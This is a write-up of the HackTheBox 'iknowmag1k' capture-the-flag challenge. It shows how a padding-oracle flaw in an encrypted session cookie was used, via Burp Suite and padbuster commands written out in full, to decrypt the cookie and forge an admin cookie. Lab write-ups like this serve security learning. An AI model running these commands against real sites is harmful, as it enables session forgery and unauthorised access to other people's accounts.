# iknowmag1k challenge
## Walkthrough on how I did it.

**(The main goal: Can you get to the profile page of the admin?)**

**Step one - making an account and intercepthing what is going on**
I simply made a login and logged in while intercepting traffic using Burpsuite.
What I saw was while refreshing: docker.hackthebox.eu:PORT/profile.php - I saw 3 cookies:
Cookie	PHPSESSID	3ol2uopq472ov8sigsbmolh9b3
Cookie	__auc	68adfe0116782dca854895bb93b
Cookie	iknowmag1k	q1zsdM2WlN3WRjvJXs8OzbhE4lB5%2BmsmhPBv9cgeGjOKmUeXEsvCZw%3D%3D


This was the only thing the really stood out to me, since there was nothing else that seemed 'weird'.
After this I thought: "Hmmm, maybe I can decode this and find some sort of thing that can help me get to the admin page!"

**Step two - find out how to crack this cookie and figuring out what to do with it.**
So I googled for a bit and found out that this sort of cryptography is called oracle padding or something like that, and I quickly saw that it was possible to crack this with a tool called: 'padbuster'.
I googled padbuster and found some basic info on how to use this, and figured out I needed the PHPSESHSSID and the iknowmag1k cookie and the url.

$padbuster http://docker.hackthebox.eu:47167/profile.php q1zsdM2WlN3WRjvJXs8OzbhE4lB5%2BmsmhPBv9cgeGjOKmUeXEsvCZw%3D%3D --cookies "PHPSESSID=3ol2uopq472ov8sigsbmolh9b3;iknowmag1k=q1zsdM2WlN3WRjvJXs8OzbhE4lB5%2BmsmhPBv9cgeGjOKmUeXEsvCZw%3D%3D" 8 --encoding=0


**And here is what I got: **


** Finished **
[+] Decrypted value (ASCII): {"user":"anders","role":"user"}


**So I figured:** "That's it! Now I just need to change the role from "user" to "admin", and then encode it again and send that as a response!"


**So that is what I did:**
$padbuster http://docker.hackthebox.eu:47167/profile.php q1zsdM2WlN3WRjvJXs8OzbhE4lB5%2BmsmhPBv9cgeGjOKmUeXEsvCZw%3D%3D --cookies "PHPSESSID=3ol2uopq472ov8sigsbmolh9b3;iknowmag1k=q1zsdM2WlN3WRjvJXs8OzbhE4lB5%2BmsmhPBv9cgeGjOKmUeXEsvCZw%3D%3D" 8 --encoding=0 --plaintext "{\"user\":\"admin\",\"role\":\"admin\"}"


**Which gave me:**
** Finished **
[+] Encrypted value is: LDRCU61StZbYrdIXPROTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D
So I simply just changed the "iknowmag1k" cookie with the new one and then got the flag.
